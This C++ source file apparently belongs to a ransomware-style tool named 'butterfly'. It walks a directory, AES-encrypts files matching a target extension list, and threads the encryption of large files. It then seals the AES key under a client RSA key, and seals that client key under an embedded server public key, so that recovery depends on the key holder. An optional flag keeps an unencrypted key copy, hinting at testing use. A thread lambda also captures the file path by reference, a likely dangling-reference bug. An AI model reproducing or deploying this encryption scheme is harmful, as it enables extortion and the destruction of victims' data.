
#include "crypto/encryptor.h"

namespace butterfly
{

namespace hybrid
{

Encryptor::Encryptor(int keySize) : _keySize(keySize),
                                    _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                    _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                    _aesEncryptor(new aes::AESEncryptor())
{
    #ifdef LOGGING
    LOG_TRACE("Create class Encryptor");
    #endif
}

void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
{
    // 32 Bytes AESKey + 16 Bytes IV
    if ( !butterfly::writeBinFile(butterfly::params::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
    {
        #ifdef LOGGING
        LOG_ERROR("Could not save the unencrypted AESKeyPair File to Filesystem!");
        #else
        std::cerr << "Could not save the unencrypted AESKeyPair File to Filesystem!" << std::endl;
        #endif
    }

}

void Encryptor::checkIfEncryptionFilesExists()
{
    if ( butterfly::existsFile(butterfly::params::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::params::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::params::RSA_EKIV_FILENAME) )
    {
        std::cerr << "Aborting encryption because encryption files (" << butterfly::params::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::params::ENC_AESKEY_FILENAME << ", " << butterfly::params::RSA_EKIV_FILENAME <<") already exists!" << std::endl;
        exit(1);
    }
}

void Encryptor::invokeDir(const std::string &dirPath, bool protection)
{
    // Ensure that no encryption files already exists!
    checkIfEncryptionFilesExists();

    // Check if dirPath exists
    if ( !DirectoryIterator::exists(dirPath) )
    {
        throw EncryptorException("Provided Directory Path " + dirPath + " doesn´t exists!");
    }

    // Get all files from provided directory path
    auto files =  DirectoryIterator::getAllFiles(dirPath);

    if ( files.empty() )
    {
        throw EncryptorException("Provided Directory Path " + dirPath + " is empty!");
    }

    #ifdef LOGGING
        LOG_TRACE("Found " << files.size() << " files in directory " << dirPath);
    #endif

    // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
    encryptCPrivateRSA();


    if ( !aes::AESEncryptor::isInitialized() )
    {

        bool rc = _aesEncryptor->generateAESKeyWithSalt();

        if ( !rc && (!_aesEncryptor->isInitialized()) )
        {
            throw AESEncryptionException("Error on initializing the AESKey with SALT!");
        }

    }

    // Get the AESKeyPair(AESKey + AESIV)
    std::string aeskeypair = _aesEncryptor->getAESKeyPair();
    #ifdef LOGGING
    LOG_TRACE("Length of AESKEYPair: " << aeskeypair.length() << " with AESKey: " << _aesEncryptor->getAESKey().length() << " and AESIV: " << _aesEncryptor->getAESIv().length());
    #endif

    // If --protected is enabled
    if (protection)
    {
        saveUnencryptedAESKeyPair(aeskeypair);
    }

    // Iterate over all file paths
    for (auto &file: files)
    {
        // Check if the provided file extension is part of the fileExtensionVector
        if ( std::find(butterfly::fileExtensionVec.begin(), butterfly::fileExtensionVec.end(), DirectoryIterator::getFileExtension(file)) != butterfly::fileExtensionVec.end() )
        {

            // Compare file size with the MAX FILE SIZE
            if ( butterfly::getFileSize(file.string(), true) > butterfly::params::MAX_FILE_SIZE )
            {
                #ifdef LOGGING
                LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
                #endif
                spawnThread(file.string());
            } else
            {
                encryptFileWithAES(file.string());
            }

        }

    }

    // Join all threads which were spawned for large file encryption
    joinThreads();

    // Save the AESKEY Pair in the final AESKey.bin file
    encryptFinalAESKeyWithRSA(aeskeypair);

}

void Encryptor::encryptCPrivateRSA()
{

    try
    {
        // Get the CPrivateRSA.pem file string
        std::string cPrivateRSAStr = _rsaEncryptorAESKey->getPrivateKeyStr();

        // Encrypt the CPrivateRSA.pem file string
        int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(_rsaEncryptorCPrivateRSA->getEvpPkey(), cPrivateRSAStr);
        //int encMSGLen = _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr);

        // Get the encrypted CPrivateRSA.pem string
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();

        // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::params::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);

    } catch (RSAEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        // If error occurred here, it makes no sense to continue
        throw EncryptorException("Error occurred on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what()));
    }

}

void Encryptor::encryptFileWithAES(const std::string &filepath)
{

    try
    {
        // Encrypt the file with AES
        _aesEncryptor->encryptFile(filepath);

    } catch (AESEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
    }

}

void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair)
{

    try
    {
        // Encrypt the AES Key String
        int encMSGLen = _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyPair);
        //int encMSGLen = _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);

        // Get the encrypted AES Key String
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();

        // Save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->writeEncMSGToFile(butterfly::params::ENC_AESKEY_FILENAME, aesKeyEnc, encMSGLen);

    } catch (RSAEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        // If error occurred here, save AESKeyPair unencrypted to ensure that files can be decrypted manually
        saveUnencryptedAESKeyPair(aesKeyPair);
    }

}

void Encryptor::spawnThread(const std::string &filepath)
{

    // Create dedicated thread for this encryption file
    std::thread t([&filepath]()
    {
        // Create new instance for each large file
        std::unique_ptr<aes::AESEncryptor> aesEncInstance = std::unique_ptr<aes::AESEncryptor>(new aes::AESEncryptor());
        try
        {
            // Encrypt the file with AES
            aesEncInstance->encryptLargeFile(filepath);

        } catch (AESEncryptionException &e)
        {
            std::cerr << e.what() << std::endl;
        }

    });

    // Save thread in thread vector
    _threads.push_back(std::move(t));
}

void Encryptor::joinThreads()
{
    for (auto &t: _threads)
    {
        if ( t.joinable() )
            t.join();
    }
}

} // namespace hybrid

} // namespace butterfly
